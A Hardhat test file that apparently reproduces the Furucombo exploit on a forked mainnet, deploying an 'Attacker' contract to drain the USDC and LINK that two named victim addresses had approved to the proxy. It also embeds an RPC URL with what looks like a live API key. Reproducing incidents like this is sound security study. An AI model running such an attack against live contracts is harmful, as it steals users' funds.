const { expect } = require('chai')
const { ethers } = require('hardhat')
const { BigNumber } = require('ethers')

describe('Furucombo', function () {
  beforeEach(async () => {
    await hre.network.provider.request({
      method: 'hardhat_reset',
      params: [
        {
          forking: {
            jsonRpcUrl:
              'https://eth-mainnet.alchemyapi.io/v2/aJJm6BCRq4NOK0k5VXTIZWc7ghr8s_pV',
            blockNumber: 11940499,
          },
        },
      ],
    })

    furucombo = await ethers.getContractAt(
      `IProxy`,
      `0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f`,
    )
    aaveV2Proxy = await ethers.getContractAt(
      `IProxy`,
      `0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9`,
    )
    usdc = await ethers.getContractAt(
      `IERC20`,
      `0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48`,
    )
    link = await ethers.getContractAt(
      `IERC20`,
      `0x514910771af9ca656af840dff83e8264ecf986ca`,
    )

    let victimBalanc

    Attacker = await ethers.getContractFactory('Attacker')
    attacker = await Attacker.deploy()
    ;[attackerAddr, addr1, addr2, _] = await ethers.getSigners()
  })

  describe('Preparation', function () {
    it('checks _isValid(aaveV2Proxy)', async function () {
      const latestBlock = await hre.ethers.provider.getBlock('latest')
      console.log(`Block time: ${new Date(latestBlock.timestamp * 1000)}`)

      const HANDLER_REGISTRY = `0x6874162fd62902201ea0f4bf541086067b3b88bd802fac9e150fd2d1db584e19`
      const registryAddr = BigNumber.from(
        await ethers.provider.getStorageAt(furucombo.address, HANDLER_REGISTRY),
      ).toHexString()
      console.log(`Registry address: ${registryAddr}`)
      const registry = await ethers.getContractAt(`IRegistry`, registryAddr)
      const isValid = await registry.isValid(aaveV2Proxy.address)
      expect(isValid, '!isValid').to.be.true
    })
  })

  describe('USDC attack', function () {
    const victimAddr = `0x13f6f084e5faded2276def5149e71811a7abeb69`

    it('check allowances', async function () {
      victimBalanc = await usdc.balanceOf(victimAddr)
      const allowance = await usdc.allowance(victimAddr, furucombo.address)
      console.log(
        `Victim USDC balance: ${ethers.utils.formatUnits(victimBalanc, 6)}`,
      )
    })

    it('performs attack', async function () {
      tx = await attacker.setup()
      tx = await attacker.performAttack(usdc.address, victimAddr)
      const attackerBalance = await usdc.balanceOf(
        await attackerAddr.getAddress(),
      )
      expect(attackerBalance.toString(), 'attacker wrong balance').to.equal(
        victimBalanc.toString(),
      )
    })
  })

  describe('LINK attack', function () {
    victimAddr = `0x700dc116de77a4a8493a2a282cc65c533fdc2a7e`

    it('check allowances', async function () {
      victimBalanc = await link.balanceOf(victimAddr)
      const allowance = await link.allowance(victimAddr, furucombo.address)
      console.log(
        `Victim LINK balance: ${ethers.utils.formatUnits(victimBalanc, 6)}`,
      )
    })

    it('performs attack', async function () {
      tx = await attacker.setup()
      tx = await attacker.performAttack(link.address, victimAddr)
      const attackerBalance = await link.balanceOf(
        await attackerAddr.getAddress(),
      )
      expect(attackerBalance.toString(), 'attacker wrong balance').to.equal(
        victimBalanc.toString(),
      )
    })
  })
})
